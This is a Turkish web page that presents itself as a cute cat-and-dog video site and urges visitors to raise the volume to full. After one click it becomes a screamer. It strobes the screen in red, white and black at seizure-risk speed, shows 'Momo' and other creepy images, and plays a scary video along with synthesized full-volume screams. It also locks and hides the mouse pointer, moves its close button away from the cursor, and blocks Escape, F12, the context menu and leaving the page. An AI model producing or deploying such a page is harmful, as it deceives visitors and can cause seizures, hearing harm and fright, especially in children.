<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🐾 Tatlı Hayvanlar Dünyası 🐱</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  html, body {
    width: 100vw;
    height: 100vh;
    overflow: hidden;
    background: #000;
    user-select: none;
    font-family: 'Arial Rounded MT Bold', 'Comic Sans MS', sans-serif;
    cursor: none !important; /* Mouse imlecini tamamen gizler */
  }

  /* SEVİMLİ GİRİŞ EKRANI */
  #intro {
    position: fixed;
    inset: 0;
    background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 10000;
    cursor: pointer !important;
    text-align: center;
    padding: 20px;
  }

  .sound-warning {
    background: rgba(255, 255, 255, 0.9);
    color: #ff3366;
    padding: 12px 25px;
    border-radius: 30px;
    font-size: clamp(1.1em, 3vw, 1.8em);
    font-weight: bold;
    border: 3px dashed #ff3366;
    margin-bottom: 25px;
    box-shadow: 0 5px 15px rgba(255, 51, 102, 0.2);
    animation: pulseWarning 1s infinite alternate;
  }

  @keyframes pulseWarning {
    from { transform: scale(1); }
    to { transform: scale(1.05); }
  }

  #intro h1 {
    color: #ff4757;
    font-size: clamp(2em, 6vw, 4.5em);
    animation: bounce 0.8s infinite alternate;
  }

  #intro p {
    color: #2ed573;
    font-size: clamp(1.2em, 3.5vw, 2em);
    margin-top: 15px;
    font-weight: bold;
    background: #fff;
    padding: 10px 25px;
    border-radius: 50px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
  }

  .btn {
    margin-top: 30px;
    background: #ff6b81;
    color: #fff;
    padding: 20px 45px;
    font-size: clamp(1.5em, 4vw, 2.2em);
    border: 4px solid #fff;
    border-radius: 50px;
    font-weight: bold;
    box-shadow: 0 10px 25px rgba(255, 107, 129, 0.5);
    animation: pulse 0.6s infinite alternate;
  }

  @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-15px); } }
  @keyframes pulse { from { transform: scale(1); } to { transform: scale(1.08); } }

  /* ŞOK EKRANI */
  #shock {
    position: fixed;
    inset: 0;
    display: none;
    z-index: 999;
  }
  #shock.active { display: block; }

  .bg-glitch {
    position: absolute;
    inset: 0;
    animation: flashBg 0.05s infinite;
  }

  @keyframes flashBg {
    0%   { background: #000; }
    20%  { background: #ff0000; }
    40%  { background: #000; }
    60%  { background: #ffffff; }
    80%  { background: #1a001a; }
    100% { background: #ff0000; }
  }

  /* KORKUNÇ FOTOĞRAFLAR ALANI */
  .creepy-container {
    position: fixed;
    inset: 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 20px;
    z-index: 3000;
    pointer-events: none;
  }

  .creepy-img {
    width: 32vw;
    height: 50vh;
    object-fit: contain;
  }

  /* ÜST-ORTA SABİT FOTOĞRAF */
  .static-img-top {
    position: fixed;
    top: 4%;
    left: 50%;
    transform: translateX(-50%);
    width: 28vw;
    height: 28vh;
    object-fit: contain;
    z-index: 3500;
    pointer-events: none;
    filter: drop-shadow(0 0 20px #ff0000);
  }

  /* ALT-ORTA DÖRDÜNCÜ FOTOĞRAF */
  .static-img-bottom {
    position: fixed;
    bottom: 12%;
    left: 50%;
    transform: translateX(-50%);
    width: 30vw;
    height: 30vh;
    object-fit: contain;
    z-index: 3600;
    pointer-events: none;
    animation: zoomPulse 0.08s infinite alternate;
  }

  @keyframes zoomPulse {
    0% { transform: translateX(-50%) scale(1); filter: contrast(200%) drop-shadow(0 0 20px #00ffff); }
    100% { transform: translateX(-50%) scale(1.15); filter: contrast(350%) drop-shadow(0 0 40px #ff0000); }
  }

  #momoPhoto {
    animation: glitchLeft 0.06s infinite alternate;
  }

  #newPhoto {
    animation: glitchRight 0.06s infinite alternate;
  }

  @keyframes glitchLeft {
    0% { transform: scale(1) translate(0, 0); filter: contrast(250%) drop-shadow(0 0 30px #ff0000); }
    50% { transform: scale(1.1) translate(-10px, 10px); filter: invert(100%) drop-shadow(0 0 50px #00ffff); }
    100% { transform: scale(0.95) translate(10px, -10px); filter: contrast(350%) drop-shadow(0 0 40px #ff00ff); }
  }

  @keyframes glitchRight {
    0% { transform: scale(1) translate(0, 0); filter: contrast(250%) drop-shadow(0 0 30px #ff0000); }
    50% { transform: scale(1.1) translate(10px, -10px); filter: invert(100%) drop-shadow(0 0 50px #00ffff); }
    100% { transform: scale(0.95) translate(-10px, 10px); filter: contrast(350%) drop-shadow(0 0 40px #ff00ff); }
  }

  /* MP4 VİDEO EKRANI */
  #video-container {
    position: fixed;
    inset: 0;
    width: 100vw;
    height: 100vh;
    z-index: 1500;
    display: none;
  }

  #video-container video {
    width: 100%;
    height: 100%;
    object-fit: cover;
  }

  /* KAÇAN KAPAT BUTONU */
  #escapeBtn {
    position: fixed;
    top: 92%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #00ff00;
    color: #000;
    padding: 12px 28px;
    font-size: 1.3em;
    font-weight: bold;
    border: 3px solid #000;
    cursor: pointer !important;
    z-index: 9000;
    display: none;
    font-family: monospace;
  }
</style>
</head>
<body>

<!-- TATLI SEVİMLİ GİRİŞ EKRANI -->
<div id="intro">
  <div class="sound-warning">🔊 Lütfen doğal sesleri duymak için sesi fulleyin!</div>
  <h1>🐱 Siteye Giriş Yap: Tatlı Hayvanlar 🐶</h1>
  <p>En sevimli kedi ve köpek videolarını izlemek için tıklayın! ✨</p>
  <div class="btn">GİR 🐾</div>
</div>

<!-- ŞOK EKRANI -->
<div id="shock">
  <div class="bg-glitch"></div>

  <!-- ÜST-ORTA SABİT FOTOĞRAF -->
  <img class="static-img-top" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTDFDTVZjvMKPpVSvKkvy9e9lqpcM7v1YlVgUx6e-fJ2Q&s=10" alt="Üst Fotoğraf">

  <!-- ALT-ORTA DÖRDÜNCÜ FOTOĞRAF -->
  <img class="static-img-bottom" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5bJPmR3VAcRn3u7EN0l9I9tAr-_jaGc-5j9ZsrsPKTXZ2g3e-Jv_aAAM&s=10" alt="Alt Fotoğraf">

  <!-- SOL VE SAĞ YANIP SÖNEN FOTOĞRAFLAR -->
  <div class="creepy-container">
    <img id="momoPhoto" class="creepy-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjOtjQOpzGZ8tDoi4WXFen8ObiQAQ6BObUngsB2n7tIA&s=10" alt="Momo">
    <img id="newPhoto" class="creepy-img" src="https://galeri13.uludagsozluk.com/705/sirri-cozulemeyen-korkunc-fotograf_1431520.jpg" alt="Korkunç Fotoğraf">
  </div>

  <!-- MP4 VİDEO EKRANI -->
  <div id="video-container">
    <video id="scaryVideo" playsinline loop preload="auto">
      <source src="https://www.image2url.com/r2/default/videos/1789211400456-605d10e5-7e1a-487a-aafc-183f19a0f86d.mp4" type="video/mp4">
    </video>
  </div>

  <button id="escapeBtn">KAPAT</button>
</div>

<script>
let audioCtx = null;

/* FAREYİ EKRANA KİLİTLEMEK İÇİN KOD */
function lockMouse() {
  const element = document.body;
  if (element.requestPointerLock) {
    element.requestPointerLock();
  } else if (element.mozRequestPointerLock) {
    element.mozRequestPointerLock();
  } else if (element.webkitRequestPointerLock) {
    element.webkitRequestPointerLock();
  }
}

// Kullanıcı ekrana tıklar tıklamaz mouse'u tekrar içeri kilitler
document.addEventListener('click', () => {
  if (document.getElementById('shock').classList.contains('active')) {
    lockMouse();
  }
});

/* ULTRA YÜKSEK SESLİ ÇIĞLIK SENTEZLEYİCİ */
function startUltraLoudScream() {
  try {
    audioCtx = new (window.AudioContext || window.webkitAudioContext)();

    let scream1 = audioCtx.createOscillator();
    let screamGain1 = audioCtx.createGain();
    scream1.type = 'sawtooth';
    scream1.frequency.setValueAtTime(600, audioCtx.currentTime);
    scream1.frequency.exponentialRampToValueAtTime(5000, audioCtx.currentTime + 0.1);

    let lfo1 = audioCtx.createOscillator();
    lfo1.frequency.value = 45;
    let lfoGain1 = audioCtx.createGain();
    lfoGain1.gain.value = 1200;
    lfo1.connect(lfoGain1);
    lfoGain1.connect(scream1.frequency);

    screamGain1.gain.value = 1.0;
    scream1.connect(screamGain1);
    screamGain1.connect(audioCtx.destination);

    scream1.start();
    lfo1.start();

    let scream2 = audioCtx.createOscillator();
    let screamGain2 = audioCtx.createGain();
    scream2.type = 'square';
    scream2.frequency.setValueAtTime(800, audioCtx.currentTime);
    scream2.frequency.exponentialRampToValueAtTime(6000, audioCtx.currentTime + 0.2);

    screamGain2.gain.value = 0.8;
    scream2.connect(screamGain2);
    scream2.connect(audioCtx.destination);

    scream2.start();

    let bass = audioCtx.createOscillator();
    let bassGain = audioCtx.createGain();
    bass.type = 'sawtooth';
    bass.frequency.value = 95;
    bassGain.gain.value = 0.8;
    bass.connect(bassGain);
    bassGain.connect(audioCtx.destination);
    bass.start();

  } catch(e){}
}

/* GİR BUTONUNA TIKLAYINCA */
document.getElementById('intro').addEventListener('click', () => {
  document.getElementById('intro').style.display = 'none';
  document.getElementById('shock').classList.add('active');

  // Pointer Lock ile Fareyi Kilitle
  lockMouse();

  let videoContainer = document.getElementById('video-container');
  let scaryVideo = document.getElementById('scaryVideo');
  videoContainer.style.display = 'block';
  
  scaryVideo.muted = false;
  scaryVideo.volume = 1.0;
  
  let playPromise = scaryVideo.play();
  if (playPromise !== undefined) {
    playPromise.catch(error => {
      scaryVideo.muted = true;
      scaryVideo.play();
    });
  }

  startUltraLoudScream();

  setTimeout(() => {
    document.getElementById('escapeBtn').style.display = 'block';
  }, 3000);
});

/* KAÇAN KAPAT BUTONU */
const escapeBtn = document.getElementById('escapeBtn');
let escapeCount = 0;

function moveBtn() {
  escapeBtn.style.left = Math.random() * (window.innerWidth - 200) + 'px';
  escapeBtn.style.top = Math.random() * (window.innerHeight - 100) + 'px';
  escapeBtn.style.transform = 'none';
  escapeCount++;
}

escapeBtn.addEventListener('mouseenter', moveBtn);
escapeBtn.addEventListener('touchstart', (e) => { e.preventDefault(); moveBtn(); });

escapeBtn.addEventListener('click', () => {
  if (escapeCount >= 5) {
    location.reload();
  }
});

/* ÇIKIŞ ENGELLEMELERİ VE FULLSCREEN ZORLAMA */
window.addEventListener('beforeunload', (e) => {
  e.preventDefault();
  return e.returnValue = 'AYRILAMAZSIN!';
});

document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', e => {
  if(['Escape', 'F12', 'F11', 'Tab'].includes(e.key) || (e.ctrlKey && e.shiftKey)) {
    e.preventDefault();
  }
});
</script>
</body>
</html>
